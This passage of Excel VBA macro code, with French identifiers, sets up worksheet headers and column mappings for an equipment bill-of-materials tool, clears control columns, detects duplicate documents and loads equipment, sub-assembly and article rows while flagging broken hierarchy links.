    Tab_for_decoup(14) = 15
    Tab_for_decoup(15) = 1
    Tab_for_decoup(16) = 2
    Tab_for_decoup(17) = 18
    Tab_for_decoup(18) = 30
    Tab_for_decoup(19) = 1
    Tab_for_decoup(20) = 1
    
    Tab_for_decoup(21) = 10
    Tab_for_decoup(22) = 4
    Tab_for_decoup(23) = 28
    Tab_for_decoup(24) = 30
    Tab_for_decoup(25) = 8
    Tab_for_decoup(26) = 4
    Tab_for_decoup(27) = 1
    Tab_for_decoup(28) = 30 ' date
    Tab_for_decoup(29) = 30
    Tab_for_decoup(30) = 30
    
    Tab_for_decoup(31) = 20
    Tab_for_decoup(32) = 3
    Tab_for_decoup(33) = 10
    Tab_for_decoup(34) = 1
    Tab_for_decoup(35) = 20
    Tab_for_decoup(36) = 6
    Tab_for_decoup(37) = 1
    Tab_for_decoup(38) = 40
    Tab_for_decoup(39) = 12
    Tab_for_decoup(40) = 50
    
    Tab_for_decoup(41) = 15
    Tab_for_decoup(42) = 1
    Tab_for_decoup(43) = 25
    Tab_for_decoup(44) = 1
    Tab_for_decoup(45) = 100
    Tab_for_decoup(46) = 30
    'LIB_TN2 CLASS_EQU   N_INVENT    SUF_INV LIB_INV N_MAT   LIB_MAT NOM_FOUR    REF_MACH    DATE_CREAT

    ThisWorkbook.Sheets(shEquipmt).Cells(1, 1).Value = "Lib_TN2"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 2).Value = "CLASS_EQU"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 3).Value = "N_invent"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 4).Value = "N_suffixe"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 5).Value = "Lib_invent"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 6).Value = "N_Mat"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 7).Value = "Lib_Mat"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 8).Value = "Nom_Four_equ"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 9).Value = "Ref_Four_equ"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 10).Value = "Num_Elem"
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 11).Value = "Cle_Elem"

    ThisWorkbook.Sheets(shEquipmt).Cells(1, 12).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 13).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 14).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 15).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 16).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 17).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 18).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 19).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 20).Value = vbNullString
    ThisWorkbook.Sheets(shEquipmt).Cells(1, 21).Value = vbNullString
'
    
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 1).Value = "N_INVENT"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 2).Value = "SUF_INV"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 3).Value = "N_MAT"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 4).Value = "CLAS_SSE"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 5).Value = "NUM_SSEN"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 6).Value = "SUF_SSEN"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 7).Value = "LIB_SSEN"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 8).Value = "NOM_FOUR"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 9).Value = "REF_FOUR"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 10).Value = "QTE"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 11).Value = "DATE_MAJ"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 12).Value = "DATE_CREAT"
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 13).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 14).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 15).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 16).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 17).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 18).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 19).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 20).Value = vbNullString
    ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 21).Value = vbNullString
    'ThisWorkbook.Sheets(shSsEnsemble).Cells(1, 11).Value = vbnullstring
'                                                Nom_int|fffd|grateur     date creat
'NUM_SSEN    SUF_SSEN    NATURE  TECH    REPERE  PLANMABEC   SUF_MAB IND_PLAN    FOR_PLAN    NB_PLANCHE  NOM_FAB REF_FAB DESIGN  NUM_SERIE   QTE
'OBS NOTE    PIECE_RECH  SacimMabec  Ref_Integrateur Nom_int|fffd|grateur


    ThisWorkbook.Sheets(shArticles).Cells(1, 1).Value = "NUM_SSEN"
    ThisWorkbook.Sheets(shArticles).Cells(1, 2).Value = "SUF_SSEN"
    ThisWorkbook.Sheets(shArticles).Cells(1, 3).Value = "NATURE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 4).Value = "TECH"
    ThisWorkbook.Sheets(shArticles).Cells(1, 5).Value = "REPERE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 6).Value = "PLANMABEC"
    ThisWorkbook.Sheets(shArticles).Cells(1, 7).Value = "SUF_MAB"
    ThisWorkbook.Sheets(shArticles).Cells(1, 8).Value = "IND_PLAN"
    ThisWorkbook.Sheets(shArticles).Cells(1, 9).Value = "FOR_PLAN"
    ThisWorkbook.Sheets(shArticles).Cells(1, 10).Value = "NB_PLANCHE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 11).Value = "NOM_FAB"
    ThisWorkbook.Sheets(shArticles).Cells(1, 12).Value = "REF_FAB"
    ThisWorkbook.Sheets(shArticles).Cells(1, 13).Value = "DESIGN"
    ThisWorkbook.Sheets(shArticles).Cells(1, 14).Value = "NUM_SERIE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 15).Value = "QTE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 16).Value = "OBS"
    ThisWorkbook.Sheets(shArticles).Cells(1, 17).Value = "NOTE"
    ThisWorkbook.Sheets(shArticles).Cells(1, 18).Value = "PIECE_RECH"
    ThisWorkbook.Sheets(shArticles).Cells(1, 19).Value = "SacimMabec"
    ThisWorkbook.Sheets(shArticles).Cells(1, 20).Value = "Ref_Integrateur"
    ThisWorkbook.Sheets(shArticles).Cells(1, 21).Value = "SacimMabec"
    ThisWorkbook.Sheets(shArticles).Cells(1, 22).Value = "Ref_Integrateur"
    ThisWorkbook.Sheets(shArticles).Cells(1, 23).Value = "date creat"
    ThisWorkbook.Sheets(shArticles).Cells(1, 24).Value = "Num_Elem"
    ThisWorkbook.Sheets(shArticles).Cells(1, 25).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 26).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 27).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 28).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 29).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 30).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 31).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 32).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 33).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 34).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 35).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 36).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 37).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 38).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 39).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 40).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 41).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 42).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 43).Value = vbNullString
    ThisWorkbook.Sheets(shArticles).Cells(1, 40).Value = vbNullString
End Sub


Public Sub Init_var_dec(wS As Worksheet)
    Dim ind_col As Integer, ind As Integer
    
    ind = 100
    P_Num_ligne_Dec = 1         '0
    P_etat_Dec = ind            '1
    P_div_Dec = ind             '2
    P_met_Dec = ind             '3
    P_ligne_Dec = ind           '4
    P_EFP_Dec = ind             '5
    P_FP_Dec = ind              '6
    P_SFP_Dec = ind             '7
    P_OP_Dec = ind              '8
    P_lib_pt_Dec = ind          '9
    P_ilot_Dec = ind            '10
    P_zone_Dec = ind            '11
    P_Repere_Dec = ind          '12
    P_Num_ssen_Dec = ind        '13
    P_Suf_ssen_Dec = ind        '14
    P_Rep_complet_Dec = ind    '15
    P_Niveau_dec = ind         '16
    P_Simon_Dec = ind          '17
    P_Date_modif_Dec = ind     '18
    P_Categorie_Dec = ind      '19
    P_Nomencl_Dec = ind        '20
    P_Etude_ref_Dec = ind      '21
    P_Etude_suf_Dec = ind      '22
    P_Etude_nom_Dec = ind      '23
    P_design_Dec = ind         '24
    P_Ref_Int_Dec = ind        '29
    P_Nom_Int_Dec = ind        '30
    P_Code_EAN_Dec = ind       '31
    P_Qte_Dec = ind            '32
    P_SacimMabec_Dec = ind     '33
    P_lib_fonc_dec = ind       '38
    P_Obs_Dec = ind            '40
    P_note_Dec = ind           '41
    P_Piece_rech_Dec = ind     '42
    P_document_Dec = ind       '43
    P_Tech_Dec = ind           '44
    P_CtrL_For_dec = ind       '45
    
    'ShowAllRecords (ong) A v|fffd|rifier
    ind = 2
    Do
        If wS.Cells(1, ind).Value <> vbNullString Then
            ind_col = VBA.val(VBA.UCase(wS.Cells(1, ind).Value))
            If ind_col = 1 Then
                P_etat_Dec = ind            '1
            ElseIf ind_col = 2 Then
                P_div_Dec = ind             '2
            ElseIf ind_col = 3 Then
                P_met_Dec = ind             '3
            ElseIf ind_col = 4 Then
                P_ligne_Dec = ind           '4
            ElseIf ind_col = 5 Then
                P_EFP_Dec = ind             '5
            ElseIf ind_col = 6 Then
                P_FP_Dec = ind              '6
            ElseIf ind_col = 7 Then
                P_SFP_Dec = ind             '7
            ElseIf ind_col = 8 Then
                P_OP_Dec = ind              '8
            ElseIf ind_col = 9 Then
                P_lib_pt_Dec = ind
            ElseIf ind_col = 10 Then
                P_ilot_Dec = ind           '10
            ElseIf ind_col = 11 Then
                P_zone_Dec = ind           '11
            ElseIf ind_col = 12 Then
                P_Repere_Dec = ind         '12
            ElseIf ind_col = 13 Then
                P_Num_ssen_Dec = ind       '13
            ElseIf ind_col = 14 Then
                P_Suf_ssen_Dec = ind       '14
            ElseIf ind_col = 15 Then
                P_Rep_complet_Dec = ind    '15
            ElseIf ind_col = 16 Then
                P_Niveau_dec = ind         '16
            ElseIf ind_col = 17 Then
                P_Simon_Dec = ind          '17
            ElseIf ind_col = 18 Then
                P_Date_modif_Dec = ind     '18
            ElseIf ind_col = 19 Then
                P_Categorie_Dec = ind      '19
            ElseIf ind_col = 20 Then
                P_Nomencl_Dec = ind        '20
            ElseIf ind_col = 21 Then
                P_Etude_ref_Dec = ind      '21
            ElseIf ind_col = 22 Then
                P_Etude_suf_Dec = ind      '22
            ElseIf ind_col = 23 Then
                P_Etude_nom_Dec = ind      '23
            ElseIf ind_col = 24 Then
                P_design_Dec = ind         '24
            ElseIf ind_col = 29 Then
                P_Ref_Int_Dec = ind        '29
            ElseIf ind_col = 30 Then
                P_Nom_Int_Dec = ind        '30
            ElseIf ind_col = 31 Then
                P_Code_EAN_Dec = ind       '31
            ElseIf ind_col = 32 Then
                P_Qte_Dec = ind            '32
            ElseIf ind_col = 33 Then
                P_SacimMabec_Dec = ind     '33
            ElseIf ind_col = 38 Then
                P_lib_fonc_dec = ind       '38
            ElseIf ind_col = 40 Then
                P_Obs_Dec = ind            '40
            ElseIf ind_col = 41 Then
                P_note_Dec = ind           '41
            ElseIf ind_col = 42 Then
                P_Piece_rech_Dec = ind     '42
            ElseIf ind_col = 43 Then
                P_document_Dec = ind       '43
            ElseIf ind_col = 44 Then
                P_Tech_Dec = ind           '44
            ElseIf ind_col = 45 Then
                P_CtrL_For_dec = ind       '45
            ElseIf ind_col = 46 Then
                P_CtrL_lien_dec = ind      '46
            ElseIf ind_col = 48 Then
                P_CtrL_doc_dec = ind       '48
            End If
        End If
        ind = ind + 1
    Loop Until ind > 46
End Sub


Sub Effacement_Codes_Erreurs()
    Dim Ligne_Deb As Long, Ligne_Fin As Long
    Dim Col As Integer
    
    Ligne_Fin = ThisWorkbook.Worksheets(shDecoupage).Rows.Count
    With ThisWorkbook.Worksheets(shDecoupage)
        Ligne_Deb = FirstLine(shDecoupage)
        Col = .Range("Dec_Ctrl_Format").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
        Col = .Range("Dec_Ctrl_Liens").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
    End With
    
    With ThisWorkbook.Worksheets(shMateriels)
        Ligne_Deb = FirstLine(shMateriels)
        Col = .Range("Mat_Ctrl_Format").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
        Col = .Range("Mat_Ctrl_Liens").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
        Col = .Range("Mat_Ctrl_LiensDoc").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
    End With
    
    With ThisWorkbook.Worksheets(shDocuments)
        Ligne_Deb = FirstLine(shDocuments)
        Col = .Range("Doc_Ctrl_Format").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
        Col = .Range("Doc_Ctrl_Liens").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
        Col = .Range("Doc_Ctrl_LiensDoc").Column
        With .Range(.Cells(Ligne_Deb, Col), .Cells(Ligne_Fin, Col))
            .ClearContents
            .Font.FontStyle = "Normal"
            .Font.ColorIndex = xlAutomatic
        End With
    End With
End Sub


Sub charge_Process(Onglet As String)
    Dim Nb_max_process As Long
    Dim MsgInfo As String

    Nb_max_process = 0
    
    Nb_max_process = Lastline(ThisWorkbook.Sheets(Onglet))
    
    MsgInfo = IniCls.ReadStringIniLangage("MsgFWK", "MsgAnalyse") & " " & Onglet
    
    Lig = FirstLine(Onglet)
    Do Until Lig > Nb_max_process
        Num_ligne = VBA.val(VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_num_ligne).Value))
        Niveau = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_niveau).Value)

        If Onglet = shDecoupage Then
            'Ctrl_format_decoupage Onglet, Lig
            'Nouvel Algorythme ACH
            Controle_Format_Ligne ThisWorkbook.Worksheets(Onglet), Lig
            ThisWorkbook.Sheets(shCde_Nomenclature).Cells(12, 3).Value = Lig - FirstLine(Onglet) + 1
            
            frmProgression.UpdateProgress Lig / Nb_max_process, MsgInfo & vbCrLf & "Ligne : " & Lig & " / " & Nb_max_process, frmProgression.FlagAbandon
            
            Nomencl = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_nomencl).Value)
            N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_ref).Value)
            If Niveau = "E" Then charge_equipement ThisWorkbook.Sheets(Onglet) Else ThisWorkbook.Sheets(Onglet).Cells(Lig, P_CtrL_For_dec + 1).Value = Msg_Materiel_NC
        Else
            Nomencl = "O"
            If Onglet = shMateriels Then
                'Nouvel Algorythme ACH
                Controle_Format_Ligne ThisWorkbook.Worksheets(Onglet), Lig
                'Ctrl_format_materiel Onglet, Lig

                ThisWorkbook.Sheets(shCde_Nomenclature).Cells(13, 3).Value = Lig - FirstLine(Onglet) + 1
                
                frmProgression.UpdateProgress Lig / Nb_max_process, MsgInfo & vbCrLf & "Ligne : " & Lig & " / " & Nb_max_process, frmProgression.FlagAbandon
            Else
                'Nouvel Algorythme ACH
                Controle_Format_Ligne ThisWorkbook.Worksheets(Onglet), Lig
                'Ctrl_format_document Onglet, Lig
                
                ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 3).Value = Lig - FirstLine(Onglet) + 1
                frmProgression.UpdateProgress Lig / Nb_max_process, MsgInfo & vbCrLf & "Ligne : " & Lig & " / " & Nb_max_process, frmProgression.FlagAbandon
            End If
            ThisWorkbook.Sheets(Onglet).Cells(Lig, P_Num_ligne_Dec).Value = Lig - 3
            If Niveau = "E" Then
                charge_equipement_materiel
            ElseIf Niveau = "S" Then
                charge_ssen_materiel
            ElseIf Niveau = "A" Then
                charge_art_materiel
            ElseIf Niveau = "FR" Then
                charge_ssen_materiel
            ElseIf Niveau = "FD" Then
                charge_art_materiel
            End If
        End If
       
        Afichage_Comptage_Anomalies
        If frmProgression.FlagAbandon <> 0 Then Exit Do
        Lig = Lig + 1
    Loop
    
    Nb_equip_dec = Lig
End Sub

Sub Recherche_Doublons_Documents(Suppression As Boolean)
    Dim Ligne_Deb As Long, Ligne_Fin As Long, Ligne As Long
    Dim Rech      As Object
    Dim FirstAddress As String, Msg As String, Reference As String
    
    Ligne_Deb = FirstLine(shDocuments)
    Ligne_Fin = Lastline(ThisWorkbook.Worksheets(shDocuments))
    
    If Ligne_Fin <= Ligne_Deb Then Exit Sub

    With ThisWorkbook.Worksheets(shDocuments)
        .Columns("IV").NumberFormat = "General"
        .Range("IV" & Ligne_Deb).FormulaR1C1 = "=RC" & .Range("DocRefDocument").Column & " & RC" & .Range("DocSufDocument").Column
        .Range("IV" & Ligne_Deb).AutoFill Destination:=.Range("IV" & Ligne_Deb & ":IV" & Ligne_Fin), Type:=xlFillDefault
        .Range("IV" & Ligne_Deb & ":IV" & Ligne_Fin).Calculate
        .Range("IV" & Ligne_Deb & ":IV" & Ligne_Fin).Copy
        .Range("IV" & Ligne_Deb & ":IV" & Ligne_Fin).PasteSpecial Paste:=xlPasteValues, Operation:=xlNone, SkipBlanks:=False, Transpose:=False
        Application.CutCopyMode = False
        
        Msg = IniCls.ReadStringIniLangage("MsgFWK", "MsgDoublonDoc")
        
        Ligne = Ligne_Deb
        Do Until Ligne > Ligne_Fin
            If VBA.InStr(.Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value, Msg) = 0 Then
                Reference = .Cells(Ligne, 256).Value
                If VBA.Trim(Reference) <> vbNullString And .Cells(Ligne, .Range("DocNiveau").Column).Value = "FD" Then
                    Set Rech = .Columns("IV").Find(what:=Reference, LookAt:=xlWhole)
                    If Not Rech Is Nothing Then
                        FirstAddress = Rech.Address
                        Do
                            If Rech.row > Ligne Then
                                If Suppression Then
                                    'Supprimer la ligne contenant le Document en Doublon
                                    .Rows(Ligne).EntireRow.Delete
                                    Ligne = Ligne - 1
                                    Exit Do
                                Else 'Marquage des Documents en Doublons
                                    If .Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value = vbNullString Then
                                        .Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value = Msg
                                    ElseIf VBA.InStr(.Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value, Msg) = 0 Then
                                        .Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value = .Cells(Ligne, .Range("Doc_Ctrl_Liens").Column).Value & " " & Msg
                                    End If
                                    Assistance_Anomalie "MsgDoublonDoc", .Cells(Ligne, .Range("Doc_Ctrl_Liens").Column), vbNullString
                                    
                                    If .Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column).Value = vbNullString Then
                                        .Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column).Value = Msg
                                    ElseIf VBA.InStr(.Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column).Value, Msg) = 0 Then
                                        .Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column).Value = .Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column).Value & " " & Msg
                                    End If
                                    Assistance_Anomalie "MsgDoublonDoc", .Cells(Rech.row, .Range("Doc_Ctrl_Liens").Column), vbNullString
                                    Compteur_Ano_Doc = Compteur_Ano_Doc + 1
                                End If
                            End If
                            Set Rech = .Columns("IV").FindNext(Rech)
                        Loop While Not Rech Is Nothing And Rech.Address <> FirstAddress
                    End If
                End If
            End If
            Ligne = Ligne + 1
        Loop
        .Columns("IV").ClearContents
        .Activate
        .Range("A1").Select 'pour se repositionner
        ThisWorkbook.Sheets(shCde_Nomenclature).Cells(14, 4).Value = Compteur_Ano_Doc
    End With
End Sub

Sub charge_equipement_materiel()
    Dim p_anomalie As Integer, ind As Integer

    p_anomalie = 23
    N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_ref).Value)
    N_suffixe = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_suf).Value)
    mem_equipmt = N_invent & "_" & N_suffixe
    mem_inv = N_invent
    mem_inv_suf = N_suffixe
    ind = cher_equipmt_dec(mem_equipmt)
    If ind > 0 Then
        Nomencl = "O"
        ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie).Value = vbNullString '"Lien_hi|fffd|rarchique_OK"
        Nb_element_bdn = Nb_element_bdn + 1
        ThisWorkbook.Sheets(shEquipmt).Cells(ind + 1, 11).Value = Pos_creat + Nb_element_bdn
        ThisWorkbook.Sheets(shEquipmt).Cells(ind + 1, 11).Font.Bold = True
    Else
        lib_tn2 = ThisWorkbook.Sheets(Onglet).Cells(Lig, P_efp).Value
        lib_tn2 = lib_tn2 + ThisWorkbook.Sheets(Onglet).Cells(Lig, P_fp).Value
        With ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie)
            .Value = Msg_Dec_Nok '"Dec NOK"
            .Font.FontStyle = "Bold"
            .Font.ColorIndex = 3
            Assistance_Anomalie Msg_Dec_Nok, ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie), mem_equipmt
        End With
        N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_ref).Value)
        N_suffixe = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_suf).Value)
        lib_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_design).Value)
        nom_four_equ = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_nom_int).Value)
        ref_mach_equ = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ref_int).Value)
        gen_ctrl_equ
    End If
End Sub


Sub charge_ssen_materiel()
    Dim mem_ssen As String, clef_ssen As String
    Dim autorise As Boolean
    Dim p_anomalie As Integer
    p_anomalie = 23
    Lire_Dec Lig, Onglet
    
    'num_ssen = vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_etude_ref).Value)
    'suf_ssen = vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_etude_suf).Value)
    N_invent = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ssen_prin).Value)
    N_suffixe = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ssen_suff).Value)
    Lire_Dec Lig, Onglet
    num_ssen = Etude_ref_Dec
    suf_ssen = Etude_suf_Dec
    mem_equipmt = N_invent & "_" & N_suffixe
    mem_inv = Num_ssen_Dec
    mem_inv_suf = Suf_ssen_Dec
    'mem_equipmt = Num_ssen_Dec + "_" + Suf_ssen_Dec
    'clef_ssen = mem_equipmt + ":" + Repere_Dec + Etude_ref_Dec + "_" + Etude_suf_Dec
    clef_ssen = Etude_ref_Dec & "_" & Etude_suf_Dec & ":" & Repere_Dec & ":" & Etude_ref_Dec & "_" & Etude_suf_Dec
    ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie + 2).Value = clef_ssen
    'v|fffd|rif des liens : on recherche le N|fffd|inventaire+Suffixe du p|fffd|re (E) dans les onglets Decoupage et Materiel
    If cher_equipmt_niv_S(mem_equipmt) Then
        ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie).Value = vbNullString '"Lien_hi|fffd|rarchique_OK"
    Else
        With ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie)
            .Value = Msg_Lien_Nok
            .Font.FontStyle = "Bold"
            .Font.ColorIndex = 3
        End With
        Compteur_Ano_Lien = Compteur_Ano_Lien + 1
        Assistance_Anomalie_Lien Onglet, Lig, P_ssen_prin, P_ssen_suff, N_invent, N_suffixe
    End If
    ' On recherche Inventaire_Suffixe P|fffd|re - Inventaire_Suffixe dans l'onglet actif
    mem_ssen = mem_equipmt & num_ssen & "_" & suf_ssen
    If Not cher_ssen(mem_ssen) Then
        ind_ssen = ind_ssen + 1
        ThisWorkbook.Sheets(shSsEnsemble).Cells(ind_ssen, 10).Value = Num_ligne
        lib_ssen = Design_Dec 'vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_design).Value)
        Nom_Four = Nom_Int_Dec 'vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_nom_int).Value)
        Ref_Four = Ref_Int_Dec 'vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_ref_int).Value)
        qte_ssen = Qte_Dec 'vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_qte).Value)
        If qte_ssen = vbNullString Then qte_ssen = 1
        Document = Document_Dec 'vba.ucase(ThisWorkbook.Sheets(onglet).Cells(lig, P_document).Value)
        ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie + 1).Value = vbNullString
        clas_ssen = vbNullString
        gen_ctrl_ssen
        If Not cher_ssen_ssen(num_ssen + "_" + suf_ssen) Then
            ' Le SousEnsemble n'a pas |fffd|t|fffd| d|fffd|j|fffd| trait|fffd|
            autorise = True
            'Modif AC du 28/04/2008
            If Code_Dossier(suf_ssen) Then
                autorise = False
            ElseIf Code_Programme(suf_ssen) Then
                autorise = False
            End If
                
            If autorise Then charge_art (1)
        End If
    Else
        'Sous Ensemble en Doublon
        With ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie)
            .Value = Msg_Doublon_SSen & " : " & num_ssen & " " & suf_ssen
            .Font.FontStyle = "Bold"
            .Font.ColorIndex = 3
            Assistance_Anomalie Msg_Doublon_SSen, ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie), num_ssen & " " & suf_ssen
        End With

        Compteur_Ano_Lien = Compteur_Ano_Lien + 1
    End If
End Sub


' conversion d'apr|fffd|s Feuille mat|fffd|riel
Sub charge_art_materiel()
    Dim clef_art   As String
    Dim p_anomalie As Integer
    ' On charge les donn|fffd|es
    p_anomalie = 23
    num_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ssen_prin).Value)
    suf_ssen = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_ssen_suff).Value)
    mem_ssen = num_ssen + "_" + suf_ssen
    If cher_ssen_ssen(mem_ssen) Then
        ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie).Value = vbNullString '"Lien_hi|fffd|rarchique_OK"
    Else
        With ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie)
            .Value = Msg_Lien_Nok
            .Font.FontStyle = "Bold"
            .Font.ColorIndex = 3
        End With
        Compteur_Ano_Lien = Compteur_Ano_Lien + 1
        Assistance_Anomalie_Lien Onglet, Lig, P_ssen_prin, P_ssen_suff, num_ssen, suf_ssen
    End If
    If Niveau = "FD" And suf_ssen = vbNullString Then ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie).Value = Msg_Suffixe_Absent: Assistance_Anomalie Msg_Suffixe_Absent, ThisWorkbook.Sheets(Onglet).Cells(Lig, p_anomalie), vbNullString
    Repere = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_rep_equ).Value) ' a voir
    NATURE = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_categorie).Value)
    etude_ref = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_ref).Value)
    etude_suf = VBA.UCase(ThisWorkbook.Sheets(Onglet).Cells(Lig, P_etude_suf).Value)
    clef_art = Repere_Dec & ":" & etude_ref & "_" & etude_suf
    'clef_ssen = num_ssen+'Num_ssen_Dec & "_" & Suf_ssen_Dec
    Clef_complete = mem_ssen + ":" + clef_art
